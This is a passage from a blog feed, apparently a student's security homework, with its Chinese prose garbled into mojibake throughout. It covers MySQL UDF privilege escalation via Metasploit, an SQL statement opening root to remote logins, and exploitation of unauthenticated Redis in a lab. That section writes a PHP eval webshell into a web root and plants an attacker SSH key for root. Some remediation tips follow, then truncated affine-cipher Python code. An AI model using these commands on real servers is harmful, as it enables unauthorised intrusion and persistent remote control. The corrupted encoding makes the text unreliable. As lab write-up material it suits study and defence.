è½½å‡½æ•°ï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p><p>æ³¨æ„ï¼šææƒæ‰€ç”¨çš„dllåœ¨sqlmapæˆ–msfä¸­éƒ½æœ‰ï¼Œè¦ä¸å—å®³æœºçš„ç³»ç»Ÿä¸æ•°æ®åº“ä½æ•°è¿›è¡ŒåŒ¹é…ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200806175635321.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="msfææƒæ¼”ç¤º"><a href="#msfææƒæ¼”ç¤º" class="headerlink" title="msfææƒæ¼”ç¤º"></a>msfææƒæ¼”ç¤º</h3><p>è¿™é‡Œä¸»è¦æ¼”ç¤ºå¤§äº5.1çš„ç‰ˆæœ¬ã€‚<br>æ‰€ä»¥æ¥ä¸‹æ¥åˆ›å»ºç›®å½•ï¼Œå…³äºåˆ›å»ºç›®å½•ï¼Œä¸‹é¢çš„ç¬¬äºŒç¯‡å‚è€ƒæä¾›äº†ä¸€ä¸ªä½¿ç”¨NTFS ADSæµçš„æ–¹å¼ï¼Œå¤§å®¶å¯ä»¥è¿›è¡Œå°è¯•ï¼Œè¿™é‡Œæˆ‘ç›´æ¥æ‰‹å·¥è¿›è¡Œåˆ›å»ºã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦æŠŠè‡ªå®šä¹‰å¥½çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°åŠ è½½è¿›æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°†å®šä¹‰å¥½çš„ä¸€ä¸ªdllæ”¾å…¥lib\pluginè¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿™é‡Œå¦‚æœæ— æ³•ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨ï¼Œå°†dllä¸­çš„æ•°æ®åå…­è¿›åˆ¶ç¼–ç ï¼Œä¹‹ååœ¨é€šè¿‡è¯»å–çš„æ–¹å¼å†™å…¥åˆ°lib\plugin\udf.dllæ–‡ä»¶ä¸­ï¼Œè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°ä¸Šä¼ æ–‡ä»¶çš„æ•ˆæœçš„ã€‚<br>å†™å…¥æ–‡ä»¶æœ‰ä¸€ä¸ªå‰æï¼Œå°±æ˜¯secure_file_privè¿™ä¸ªé€‰é¡¹éœ€è¦ä¸ºç©ºå€¼ï¼Œè¿™æ ·æ‰å¯ä»¥åŠ è½½æˆ–å†™å…¥æ–‡ä»¶ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200806173131434.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>NULLè¡¨ç¤ºä¸å¯ä»¥å†™å…¥<br>ä¿®æ”¹mysql.iniæ–‡ä»¶ï¼Œä½¿å…¶ä¸ºç©ºå€¼</p><p><img src="https://img-blog.csdnimg.cn/20200806173252232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pbmdfeHQ=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ ·ä¸€æ¥å°±å¯ä»¥å†™å…¥æ–‡ä»¶äº†ã€‚</p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨msfè¿›è¡Œæ”»å‡»ï¼Œéœ€è¦è¿œç¨‹è¿æ¥è¯¥ä¸»æœºçš„æ•°æ®åº“ï¼Œæ‰€ä»¥è¦æå‰æŸ¥çœ‹ï¼Œè¯¥æ•°æ®åº“æ˜¯å¦å¯ä»¥è¿œç¨‹è¿æ¥ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200806173304225.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œå‘ç°rootç”¨æˆ·çš„è¿æ¥å¯¹è±¡éƒ½æ˜¯æœ¬åœ°ï¼Œå¯ä»¥ä½¿ç”¨sqlè¯­å¥è¿›è¡Œä¿®æ”¹ï¼Œå°†å…¶æ”¹ä¸ºå…è®¸è¿œç¨‹è¿æ¥</p><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host = <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;</code></pre><p>è¿™æ¡è¯­å¥æ¥ä¿®æ”¹è¿æ¥å¯¹è±¡ä¸ºæ‰€æœ‰ä¸»æœº<br>ä¹‹åå°è¯•ä½¿ç”¨msfè¿›è¡Œæ”»å‡»ã€‚</p><p>è¿›å…¥msfï¼ŒåŠ è½½exploit/multi/mysql/mysql_udf_payloadæ¨¡å—</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233528810.png" alt="image-20210425233528810" style="zoom:67%;"><p>è¿™é‡Œçš„éœ€è¦mysqlæ•°æ®åº“çš„è´¦å·å’Œå¯†ç ï¼Œä»¥åŠè¿æ¥çš„ä¸»æœºã€‚<br>è®¾ç½®å®Œä¹‹åï¼Œå°è¯•æ”»å‡»ã€‚<br>æ”»å‡»å®Œä¹‹åï¼Œåœ¨å—å®³æœºçš„lib\pluginç›®å½•ä¸‹å°†ä¼šç”Ÿæˆä¸€ä¸ªdllæ–‡ä»¶ã€‚<br>ä¹‹åæŸ¥çœ‹å·²è½½å…¥çš„å‡½æ•°å¹¶å°è¯•æ‰§è¡Œã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233540791.png" alt="image-20210425233540791" style="zoom:50%;"><p>æ‰§è¡ŒæˆåŠŸè¿”å›0ã€‚<br>ç”±äºè¯¥å‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨çš„åŠ è½½ä¸€ä¸ªæœ‰å›æ˜¾çš„å‡½æ•°ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233551282.png" alt="image-20210425233551282" style="zoom:67%;"><p>è¿™é‡Œçš„dllæ–‡ä»¶çš„åç§°æ˜¯msféšæœºçš„ï¼Œåˆ©ç”¨è¯¥æ¡å‘½ä»¤è½½å…¥äº†sys_evalå‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/20200806174919488.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æ¡å‡½æ•°æˆåŠŸå°†æ‰§è¡Œç»“æœå›æ˜¾å‡ºæ¥äº†ã€‚</p><h1 id="redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨"><a href="#redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨" class="headerlink" title="redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨"></a>redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</h1><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>Rediså› é…ç½®ä¸å½“å°±ä¼šå¯¼è‡´æœªæˆæƒè®¿é—®ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedisä¼šç»‘å®šåœ¨ 0.0.0.0:6379ã€‚å¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ · Redis æœåŠ¡ç›´æ¥æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®åˆ°ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ Redis è‡ªèº«æä¾›çš„config å‘½ä»¤è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>è¯¥æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><p>1.redisç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼›<br>2.æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç (è®¤è¯)è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚</p><p>æ¼æ´å±å®³ï¼š<br>(1) æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ï¼›<br>(2) æ”»å‡»è€…å¯é€šè¿‡æ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶ï¼›<br>(3) æœ€ä¸¥é‡çš„æƒ…å†µï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨;</p><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>åœ¨kaliä¸­å®‰è£…redis 3.2.0</p><pre><code class="hljs awk">åˆ›å»ºrediså®‰è£…ç›®å½•mkdir <span class="hljs-regexp">/usr/</span>local/rediscd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz<span class="hljs-regexp">//</span>è·å–rediså‹ç¼©åŒ…tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gzcd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>make <span class="hljs-comment">#ç¼–è¯‘å®‰è£…</span></code></pre><p>å®‰è£…å®Œæˆä¹‹åéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œé…ç½®å…è®¸å¯ä»¥è¿œç¨‹è®¿é—®ã€‚</p><p>vim redis.conf #ä¿®æ”¹é»˜è®¤é…ç½®æ–‡ä»¶</p><p>åœ¨bind 127.0.0.1å‰é¢åŠ ä¸Š#å·è¿›è¡Œæ³¨é‡Šï¼Œå¹¶å°†protected-modeè®¾ç½®ä¸ºnoã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387" style="zoom:67%;"><p>ç„¶åè¿›å…¥srcç›®å½•ï¼Œå°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰ï¼Œå¹¶å°†redis.confæ‹·è´åˆ°/etc/ç›®å½•ä¸‹ã€‚</p><pre><code class="hljs awk">cd srccp redis-cli <span class="hljs-regexp">/usr/</span>bincp redis-server <span class="hljs-regexp">/usr/</span>bincp redis.conf <span class="hljs-regexp">/etc/</span></code></pre><p>å¼€å¯redisæœåŠ¡</p><pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311" style="zoom:50%;"><p>ç¬¬ä¸€å°ä½œä¸ºæ”»å‡»æœºå³å¯ï¼Œç„¶åå°†è¿™å°ä¸»æœºå…‹éš†ä½œä¸ºç›®æ ‡ä¸»æœº</p><p>æ”»å‡»æœº</p><p>ip:192.168.164.145</p><p>ç›®æ ‡ä¸»æœº</p><p>ip:192.168.164.23</p><p>é¦–å…ˆç¡®å®šç›®æ ‡ä¸»æœºæ˜¯å¦å¼€å¯redisæœåŠ¡ï¼Œä½¿ç”¨nmapæ‰«æç«¯å£6379</p><p>å¦‚ä¸‹ï¼Œæ˜¾ç¤ºäº†ç›®æ ‡ä½¿ç”¨çš„redisç‰ˆæœ¬ä»¥åŠæœåŠ¡å™¨çš„ä¿¡æ¯</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841" style="zoom:67%;"><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="1-å†™å…¥æœ¨é©¬æ–‡ä»¶"><a href="#1-å†™å…¥æœ¨é©¬æ–‡ä»¶" class="headerlink" title="1.å†™å…¥æœ¨é©¬æ–‡ä»¶"></a>1.å†™å…¥æœ¨é©¬æ–‡ä»¶</h3><p>é¦–å…ˆè¿›å…¥rediså®‰è£…ç›®å½•çš„srcä¸­æ‰§è¡Œ</p><pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre><p>æˆåŠŸæ§åˆ¶ç›®æ ‡çš„redisæœåŠ¡</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p><p>å‘å…¶ç½‘ç«™æ ¹ç›®å½•ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span><span class="xml">config set dbfilename shell.php</span><span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span><span class="xml">save </span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p><p>saveæˆåŠŸåï¼Œç›®æ ‡ä¸»æœºçš„ç½‘ç«™æ ¹ç›®å½•å°±å‡ºç°äº†æœ¨é©¬æ–‡ä»¶</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612" style="zoom:50%;"><h3 id="2-å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†"><a href="#2-å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†" class="headerlink" title="2.å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†"></a>2.å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥è¿›è¡Œç™»é™†</h3><p>å†™å…¥sshå…¬é’¥åå¯ä»¥åœ¨æœ¬æœºå­˜å‚¨å¯¹åº”çš„sshå¯†é’¥ï¼Œç„¶åç›´æ¥æ— å¯†ç ç™»é™†ã€‚</p><p>é¦–å…ˆç”Ÿæˆå…¬é’¥å¯†é’¥æ–‡ä»¶</p><pre><code class="hljs awk">ssh-keygen -t rsacat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830" style="zoom:50%;"><p>ç»§ç»­ä½¿ç”¨å‘½ä»¤</p><pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>config <span class="hljs-keyword">set</span> authorized_keys<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pubçš„å†…å®¹<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>save</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309" style="zoom: 67%;"><p>ä½¿ç”¨å…¬é’¥è¿æ¥</p><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre><p>è¿™é‡Œçš„id_rsaä¸åˆ›å»ºsshå¯†é’¥è¾“å…¥çš„å†…å®¹ä¸€è‡´</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p><h3 id="3-åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#3-åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="3.åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>3.åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell</h3><p>åªèƒ½åœ¨centosç¯å¢ƒä¸­åˆ©ç”¨å› ä¸ºcentosç¯å¢ƒä¸­çš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶å¯ä»¥å¿½ç•¥ä¹±ç ï¼Œubuntuç¯å¢ƒå› ä¸ºæ— æ³•å¿½ç•¥æ–‡ä»¶ä¸­çš„ä¹±ç å› æ­¤æ— æ³•ä½¿ç”¨</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>1ã€é™åˆ¶ç™»å½•ip<br>åœ¨redis.confæ–‡ä»¶ä¸­è®¾ç½®redisè®¿é—®çš„ipç™½åå•ï¼Œå¦‚æœé¡¹ç›®å…è®¸çš„è¯æœ€å¥½è®¾ç½®ä¸ºåªå…è®¸æœ¬åœ°è®¿é—®ã€‚</p><p>2ã€æ·»åŠ å¯†ç <br>åœ¨redis.confé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°requirepasså¹¶å»æ‰å‰é¢çš„#ï¼Œ ç„¶ååœ¨åé¢è®¾ç½®ä¸€ä¸ªé«˜å¼ºåº¦çš„å¯†ç ã€‚å› ä¸ºrediséªŒè¯å¯†ç çš„é€Ÿåº¦å¾ˆå¿«ï¼Œç»™æ”»å‡»è€…è¿›è¡Œé«˜é€Ÿçš„çˆ†ç ´å¯†ç æä¾›äº†ä¸€ä¸ªè‰¯å¥½çš„åŸºç¡€ï¼Œæ‰€ä»¥è®¾ç½®ä¸€ä¸ªé«˜å¼ºåº¦çš„å¯†ç ä¸ä»…è§£å†³äº†æœªæˆæƒçš„é—®é¢˜è¿˜èƒ½é˜²æ­¢å¯†ç çˆ†ç ´ã€‚</p><p>3ã€ä¿®æ”¹é»˜è®¤ç«¯å£</p>]]></content>
    
    
    <categories>
      
      <category>homework</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>xss</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯†ç å­¦</title>
    <link href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <url>/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<p>å¯†ç å­¦å®éªŒè¯¾ç¨‹è®¾è®¡</p><span id="more"></span><h1 id="ä¸€ã€å¤å…¸å¯†ç "><a href="#ä¸€ã€å¤å…¸å¯†ç " class="headerlink" title="ä¸€ã€å¤å…¸å¯†ç "></a>ä¸€ã€å¤å…¸å¯†ç </h1><h2 id="ä»¿å°„å¯†ç "><a href="#ä»¿å°„å¯†ç " class="headerlink" title="ä»¿å°„å¯†ç "></a>ä»¿å°„å¯†ç </h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>ä»¿å°„åŠ å¯†åœ¨æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªç½®æ¢å¯†ç ï¼šå¦‚æœè¯´ç§»ä½å¯†ç æ˜¯ä¸€ä¸ªå¸¸æ•°çº§åˆ«çš„ç½®æ¢ï¼Œé‚£ä¹ˆï¼Œä»¿å°„åŠ å¯†æ˜¯ä¸€ä¸ªä¸€æ¬¡çº§åˆ«çš„ç½®æ¢</p><h3 id="åŠ å¯†åŸç†"><a href="#åŠ å¯†åŸç†" class="headerlink" title="åŠ å¯†åŸç†"></a>åŠ å¯†åŸç†</h3><p>å‡è®¾Xï¼ŒYï¼ŒAï¼ŒBæ˜¯Z26æ•´æ•°ç¯ä¸­çš„å…ƒç´ ï¼ŒAå’ŒBä¸ºå¯†é’¥ï¼ŒXæ˜¯åŸæ–‡ï¼ŒYæ˜¯å¯†æ–‡</p><p>åŠ å¯†å‡½æ•°ï¼šY=ï¼ˆAX+Bï¼‰%26</p><p>è§£å¯†å‡½æ•°ï¼šY=ï¼ˆAX+Bï¼‰%26ï¼Œå¾—åˆ°ï¼šX=ï¼ˆAçš„é€†å…ƒï¼‰*ï¼ˆY-Bï¼‰%26</p><p>åŸç†å¾ˆç®€å•ï¼Œä»£ç å®ç°ä¹Ÿæ¯”è¾ƒç®€å•</p><h3 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><p>å„ä¸ªå‡½æ•°ä½œç”¨</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span></span>  æ±‚<span class="hljs-selector-tag">a</span>,bçš„æœ€å¤§å…¬å› å­<span class="hljs-function"><span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span></span>  è®¡ç®—aæ¨¡mçš„é€†å…ƒ<span class="hljs-function"><span class="hljs-title">encode</span><span class="hljs-params">(a,b,s)</span></span>       ä»¿å°„åŠ å¯†<span class="hljs-function"><span class="hljs-title">decode</span><span class="hljs-params">(a,b,s)</span></span>ä»¿å°„è§£å¯†</code></pre><p>åˆ©ç”¨æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚é€†å…ƒ</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span>(<span class="hljs-params">a,b</span>):</span>  <span class="hljs-comment"># æ±‚å‡ºæœ€å¤§å…¬å› æ•°</span>    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:        a,b = b%a,a    <span class="hljs-keyword">return</span> b<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span>(<span class="hljs-params">a,m</span>):</span> <span class="hljs-comment">#æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€†</span>    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:        q = u3//v3        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3    <span class="hljs-keyword">return</span> u1%m</code></pre><p>å®Œæ•´ä»£ç å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span>(<span class="hljs-params">a,b</span>):</span>  <span class="hljs-comment"># æ±‚å‡ºæœ€å¤§å…¬å› æ•°</span>    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:        a,b = b%a,a    <span class="hljs-keyword">return</span> b<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span>(<span class="hljs-params">a,m</span>):</span> <span class="hljs-comment">#æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€†</span>    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:        q = u3//v3        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3    <span class="hljs-keyword">return</span> u1%m<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">a,b,s</span>):</span>    result = <span class="hljs-string">&quot;&quot;</span>          <span class="hljs-comment"># ä¿å­˜åŠ å¯†ç»“æœ</span>    s = s.upper() <span class="hljs-comment"># å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™ï¼Œæ–¹ä¾¿è®¡ç®—</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):        s2 = <span class="hljs-built_in">chr</span>((a*(<span class="hljs-built_in">ord</span>(s[i])-<span class="hljs-number">65</span>)+b)%<span class="hljs-number">26</span> + <span class="hljs-number">65</span>)  <span class="hljs-comment">#ä½¿ç”¨åŠ å¯†å…¬å¼ Y=ï¼ˆAX+Bï¼‰%26</span>        result = result +s2    print(result.lower())<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">a,b,s</span>):</span>    a1 = findModReverse(a,<span class="hljs-number">26</span>)    result = <span class="hljs-string">&quot;&quot;</span>    s = s.upper()    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s)):        s2 = <span class="hljs-built_in">chr</span>((a1 * (<span class="hljs-built_in">ord</span>(s[i]) - <span class="hljs-number">65</span> - b)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>) <span class="hljs-comment"># ä½¿ç”¨è§£å¯†å…¬å¼X=ï¼ˆAçš„é€†å…ƒï¼‰*ï¼ˆY-Bï¼‰%26</span>        result = result + s2    print(result.lower())<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s_decode</span>(<span class="hljs-params">a,b,s</span>):</span>    letter =<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>    letter = letter.upper()    s = s.upper()    result = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(letter)):            <span class="hljs-keyword">if</span> i == letter[(a*j+b)%<span class="hljs-number">26</span>]:                result = result+letter[j]    print(result.lower())<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><span class="hljs-comment"># ä¸»å‡½æ•°å…¥å£</span>    answer 